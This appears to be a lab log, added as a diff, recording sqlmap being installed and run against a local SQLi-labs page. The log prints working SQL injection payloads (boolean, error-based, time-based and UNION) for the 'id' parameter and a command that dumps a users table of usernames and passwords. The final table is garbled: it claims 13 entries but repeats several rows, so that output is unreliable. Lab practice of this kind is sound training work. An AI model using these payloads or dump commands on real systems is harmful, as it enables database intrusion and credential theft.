@@ -1,0 +1,176 @@
+comando: sudo apt install sqlmap
+
+
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+The following package was automatically installed and is no longer required:
+  libllvm17t64
+Use 'sudo apt autoremove' to remove it.
+The following additional packages will be installed:
+  python3-magic
+The following NEW packages will be installed:
+  python3-magic sqlmap
+0 upgraded, 2 newly installed, 0 to remove and 64 not upgraded.
+Need to get 6946 kB of archives.
+After this operation, 11.2 MB of additional disk space will be used.
+Do you want to continue? [Y/n] y
+Get:1 http://archive.ubuntu.com/ubuntu noble/main amd64 python3-magic all 2:0.4.27-3 [13.4 kB]
+Get:2 http://archive.ubuntu.com/ubuntu noble/universe amd64 sqlmap all 1.8.4-1 [6933 kB]
+Fetched 6946 kB in 2s (3352 kB/s) 
+Selecting previously unselected package python3-magic.
+(Reading database ... 56022 files and directories currently installed.)              
+Preparing to unpack .../python3-magic_2%3a0.4.27-3_all.deb ...                       
+Unpacking python3-magic (2:0.4.27-3) ...                                             
+Selecting previously unselected package sqlmap.                                      
+Preparing to unpack .../sqlmap_1.8.4-1_all.deb ...                                   
+Unpacking sqlmap (1.8.4-1) ...                                                       
+Setting up python3-magic (2:0.4.27-3) ...                                            
+Setting up sqlmap (1.8.4-1) ...                                                      
+Processing triggers for man-db (2.12.0-4build2) ...                                  
+
+
+comando: sqlmap -u "http://localhost:8080/Less-1/?id=1"
+        ___
+[*] starting @ 13:47:41 /2025-07-01/
+
+[13:47:42] [INFO] testing connection to the target URL
+[13:47:42] [INFO] checking if the target is protected by some kind of WAF/IPS
+[13:47:42] [INFO] testing if the target URL content is stable
+[13:47:42] [INFO] target URL content is stable
+[13:47:42] [INFO] testing if GET parameter 'id' is dynamic
+[13:47:42] [INFO] GET parameter 'id' appears to be dynamic
+[13:47:42] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[13:47:42] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[13:47:42] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+[13:48:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[13:48:22] [WARNING] reflective value(s) found and filtering out
+[13:48:22] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
+[13:48:22] [INFO] testing 'Generic inline queries'
+[13:48:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[13:48:22] [INFO] GET parameter 'id' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
+[13:48:22] [INFO] testing 'MySQL inline queries'
+[13:48:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[13:48:22] [WARNING] time-based comparison requires larger statistical model, please wait............. (done)
+[13:48:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[13:48:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'  
+[13:48:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[13:48:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[13:48:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[13:48:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'       
+[13:48:32] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[13:48:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[13:48:32] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[13:48:32] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[13:48:32] [INFO] target URL appears to have 3 columns in query
+[13:48:32] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 2715=2715 AND 'yUxR'='yUxR
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176627071,(SELECT (ELT(5988=5988,1))),0x716b787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'vWZH'='vWZH
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 4011 FROM (SELECT(SLEEP(5)))rWZc) AND 'vsiL'='vsiL    
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-6687' UNION ALL SELECT NULL,CONCAT(0x7176627071,0x6144434374734b42646a714a4b51437666755a73614d79614d566b5878434a5767594b4465467050,0x716b787671),NULL-- -
+---
+[13:48:43] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.5
+[13:48:43] [INFO] fetched data logged to text files under '/home/bibie/.local/share/sqlmap/output/localhost'
+[13:48:43] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 13:48:43 /2025-07-01/
+
+COMANDO: sqlmap -u "http://localhost:8080/Less-1/?id=1" -D security -T users --dump
+    
+[*] starting @ 13:49:16 /2025-07-01/
+
+[13:49:16] [INFO] resuming back-end DBMS 'mysql' 
+[13:49:16] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 2715=2715 AND 'yUxR'='yUxR
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176627071,(SELECT (ELT(5988=5988,1))),0x716b787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'vWZH'='vWZH
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 4011 FROM (SELECT(SLEEP(5)))rWZc) AND 'vsiL'='vsiL    
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-6687' UNION ALL SELECT NULL,CONCAT(0x7176627071,0x6144434374734b42646a714a4b51437666755a73614d79614d566b5878434a5767594b4465467050,0x716b787671),NULL-- -
+---
+[13:49:16] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.5
+[13:49:16] [INFO] fetching columns for table 'users' in database 'security'
+[13:49:16] [INFO] retrieved: 'id','int(3)'
+[13:49:16] [INFO] retrieved: 'username','varchar(20)'
+[13:49:16] [INFO] retrieved: 'password','varchar(20)'
+[13:49:16] [INFO] fetching entries for table 'users' in database 'security'
+[13:49:16] [INFO] retrieved: '1','Dumb','Dumb'
+[13:49:16] [INFO] retrieved: '2','I-kill-you','Angelina'
+[13:49:16] [INFO] retrieved: '3','p@ssword','Dummy'
+[13:49:16] [INFO] retrieved: '4','crappy','secure'
+[13:49:16] [INFO] retrieved: '5','stupidity','stupid'
+[13:49:17] [INFO] retrieved: '6','genious','superman'
+[13:49:17] [INFO] retrieved: '7','mob!le','batman'
+[13:49:17] [INFO] retrieved: '8','admin','admin'
+[13:49:17] [INFO] retrieved: '9','admin1','admin1'
+[13:49:17] [INFO] retrieved: '10','admin2','admin2'
+[13:49:17] [INFO] retrieved: '11','admin3','admin3'
+[13:49:17] [INFO] retrieved: '12','dumbo','dhakkan'
+[13:49:17] [INFO] retrieved: '14','admin4','admin4'
+Database: security
+Table: users
+[13 entries]
++----+------------+----------+
+| id | password   | username |
++----+------------+----------+
+| 1  | Dumb       | Dumb     |
+| 2  | I-kill-you | Angelina |
+| 3  | p@ssword   | Dummy    |
+| 4  | crappy     | secure   |
+| 5  | stupidity  | stupid   |
+| 6  | genious    | superman |
+| 7  | mob!le     | batman   |
+| 8  | admin      | admin    |
+| 9  | admin1     | admin1   |
+| 10 | admin2     | admin2   |
+| 11 | admin3     | admin3   |
+| 11 | admin3     | admin3   |
+| 11 | admin3     | admin3   |
+| 11 | admin3     | admin3   |
+| 11 | admin3     | admin3   |
+| 12 | dumbo      | dhakkan  |
+| 11 | admin3     | admin3   |
+| 12 | dumbo      | dhakkan  |
+| 14 | admin4     | admin4   |
++----+------------+----------+
+
+[13:49:17] [INFO] table '`security`.users' dumped to CSV file '/home/bibie/.local/share/sqlmap/output/localhost/dump/security/users.csv'
+[13:49:17] [INFO] fetched data logged to text files under '/home/bibie/.local/share/sqlmap/output/localhost'
+[13:49:17] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 13:49:17 /2025-07-01/
